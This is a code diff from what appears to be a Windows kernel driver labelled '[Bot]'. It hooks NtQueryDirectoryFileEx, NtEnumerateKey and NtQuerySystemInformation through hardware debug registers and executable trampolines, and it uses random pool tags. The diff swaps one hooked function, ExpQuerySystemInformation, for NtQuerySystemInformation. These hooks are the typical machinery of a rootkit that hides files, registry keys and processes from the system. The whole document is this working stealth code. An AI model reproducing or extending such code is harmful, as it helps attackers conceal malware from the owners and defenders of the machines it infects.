@@ -43,7 +43,7 @@ __declspec(noinline) void setDr(PVOID param) {
 	dr7 |= 0x1 << 3;
 	dr7 &= ~(0xf << 20);
 
-	dr2 = funAddr.ExpQuerySystemInformation;
+	dr2 = NtQuerySystemInformation;
 	dr7 |= 0x1 << 5;
 	dr7 &= ~(0xf << 24);
 
@@ -60,7 +60,7 @@ extern uint32_t drHit;
 
 NtQueryDirectoryFileEx_t origNtQueryDirectoryFileEx;
 NtEnumerateKey_t origNtEnumerateKey;
-ExpQuerySystemInformation_t origExpQuerySystemInformation;
+NtQuerySystemInformation_t origNtQuerySystemInformation;
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	HANDLE han;
@@ -92,11 +92,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 	queryDirInst = hde64_disasm(NtQueryDirectoryFileEx, &hs);
 	enumKeyInst = hde64_disasm(funAddr.NtEnumerateKey, &hs);
-	querySystemInst = hde64_disasm(funAddr.ExpQuerySystemInformation, &hs);
+	querySystemInst = hde64_disasm(NtQuerySystemInformation, &hs);
 	tramp = ExAllocatePoolWithTag(NonPagedPoolExecute, (uint64_t)queryDirInst + (uint64_t)enumKeyInst + (uint64_t)querySystemInst + sizeof(absJmp) * 3 + 8 * 3, rand_tag(&state));
 
 	origNtQueryDirectoryFileEx = tramp;
-	memcpy(tramp, NtQueryDirectoryFileEx, queryDirInst);
+	memcpy(tramp, (PVOID)NtQueryDirectoryFileEx, queryDirInst);
 	tramp += queryDirInst;
 	memcpy(tramp, absJmp, sizeof(absJmp));
 	tramp += sizeof(absJmp);
@@ -111,12 +111,12 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	*((uint64_t*)tramp) = funAddr.NtEnumerateKey + (uint64_t)enumKeyInst;
 	tramp += 8;
 
-	origExpQuerySystemInformation = tramp;
-	memcpy(tramp, (PVOID)funAddr.ExpQuerySystemInformation, querySystemInst);
+	origNtQuerySystemInformation = tramp;
+	memcpy(tramp, (PVOID)NtQuerySystemInformation, querySystemInst);
 	tramp += querySystemInst;
 	memcpy(tramp, absJmp, sizeof(absJmp));
 	tramp += sizeof(absJmp);
-	*((uint64_t*)tramp) = funAddr.ExpQuerySystemInformation + (uint64_t)querySystemInst;
+	*((uint64_t*)tramp) = (uint64_t)((uint8_t*)NtQuerySystemInformation + querySystemInst);
 	tramp += 8;
 
 	//KeIpiGenericCall(setupDr, (uint64_t)NtQueryDirectoryFileEx);
@@ -168,7 +168,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 	DbgPrintEx(0, 0, "[Bot] Thread %x\n", status);
 
 	//vybral jsem max
-	DbgPrintEx(0, 0, "[Bot] EnumKey %p ExpQuery %p\n", funAddr.NtEnumerateKey, funAddr.ExpQuerySystemInformation);
+	DbgPrintEx(0, 0, "[Bot] EnumKey %p\n", funAddr.NtEnumerateKey);
 	DbgPrintEx(0, 0, "[Bot] Active: %u Max: %u\n", KeQueryActiveProcessorCount(NULL), KeQueryMaximumProcessorCount());
 	DbgPrintEx(0, 0, "[Bot] %p %p\n", __readdr(0), __readdr(7));
 	DbgPrintEx(0, 0, "[Bot] %u\n", fun(4, 5));
